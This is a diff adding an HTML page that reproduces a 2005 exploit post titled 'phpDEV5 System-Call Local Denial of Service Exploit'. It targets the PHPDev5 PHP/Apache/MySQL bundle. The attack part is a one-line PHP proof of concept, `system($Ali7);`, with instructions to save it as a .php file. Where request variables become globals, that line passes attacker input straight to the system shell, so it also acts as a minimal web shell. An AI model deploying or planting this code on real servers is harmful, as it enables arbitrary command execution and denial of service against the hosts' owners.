@@ -1,0 +1,35 @@
+<html>
+<head>
+<title>phpDEV5 System-Call Local Denial of Service Exploit</title>
+<pre>
+------------------------------------------------------------------------
+# PHPDev5 &lt;== Apache Server Local Denial-of-Service PoC
+# By : Ali7
+# e-mail : ali7@hotmail.co.uk
+# date : 16-03-2k5
+# greetz : our group :P
+ 
+
+&gt;Target : PHPDev 5
+&gt;URL : www.firepages.com.au - http://sourceforge.net/projects/phpdev5/
+&gt;Type : PHP/Apache/MySQL Server..
+..
+ 
+&gt;&gt;PoC Sample :
+ 
+Save this code as .php or .php3 file..
+ 
+//start
+ 
+&lt;?
+
+system($Ali7);
+
+?&gt;
+ 
+//end
+
+# milw0rm.com [2005-03-17]
+</pre>
+</html>
+
